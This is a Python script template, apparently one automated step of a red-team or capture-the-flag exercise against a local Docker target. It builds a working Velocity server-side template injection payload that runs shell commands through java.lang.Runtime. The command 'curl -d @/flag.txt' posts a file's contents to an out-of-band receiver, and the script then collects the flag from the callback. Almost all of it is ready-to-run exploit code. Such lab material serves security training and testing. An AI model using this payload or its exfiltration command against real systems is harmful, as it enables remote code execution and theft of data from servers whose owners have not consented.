  lang: python
  template: "import urllib.parse\nfrom redteam_sdk import HttpClient, OOBReceiver,\
    \ save_context\n\nTARGET_URL = \"http://host.docker.internal:9443\"\n\ndef main():\n\
    \    # 启动 OOB 接收器\n    oob = OOBReceiver(port=8765)\n    oob_url = oob.url\n \
    \   print(f\"[*] OOB URL: {oob_url}\")\n\n    # 构造 SSTI 恶意 payload，通过 Velocity\
    \ 执行任意命令\n    # 命令：curl -d @/flag.txt <oob_url>  (将 flag 文件内容 POST 到 OOB 服务器)\n\
    \    cmd = f\"curl -d @/flag.txt {oob_url}\"\n    # 注意：Velocity 使用单引号包围 sh 命令，内部双引号直接使用\n\
    \    # payload 整体用单引号括起 Velocity 字符串，避免转义冲突\n    payload = \"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime().exec('sh\
    \ -c \\\"\" + cmd + \"\\\"'))$rt.waitFor()\"\n\n    # URL 编码\n    encoded_payload\
    \ = urllib.parse.quote(payload, safe='')\n    request_url = f\"/?text={encoded_payload}\"\
    \n    print(f\"[*] Sending SSTI payload via GET {request_url}\")\n\n    client\
    \ = HttpClient(base_url=TARGET_URL)\n    try:\n        resp = client.get(request_url)\n\
    \        print(f\"[+] Request sent, status: {resp.status_code}\")\n    except\
    \ Exception as e:\n        print(f\"[-] HTTP request failed (but command may still\
    \ execute): {e}\")\n\n    # 等待 OOB 回调，接收 flag 内容\n    print(\"[*] Waiting for\
    \ OOB callback...\")\n    try:\n        # 假设 OOBReceiver 的 receive 方法返回一个 HTTP\
    \ 请求对象，其 data 属性为请求体\n        oob_request = oob.receive(timeout=15)\n        if\
    \ oob_request:\n            flag = oob_request.data  # 字节或字符串，按实际调整\n        \
    \    if isinstance(flag, bytes):\n                flag = flag.decode(\"utf-8\"\
    , errors=\"replace\")\n            print(f\"[+] Received flag via OOB: {flag}\"\
    )\n            # 保存上下文，便于后续步骤（可选）\n            save_context({\"flag\": flag})\n\
    \        else:\n            print(\"[-] No OOB data received (timeout)\")\n  \
    \  except Exception as e:\n        print(f\"[-] OOB receive error: {e}\")\n\n\
    \    print(\"STEP_OK\")\n\nif __name__ == \"__main__\":\n    main()"
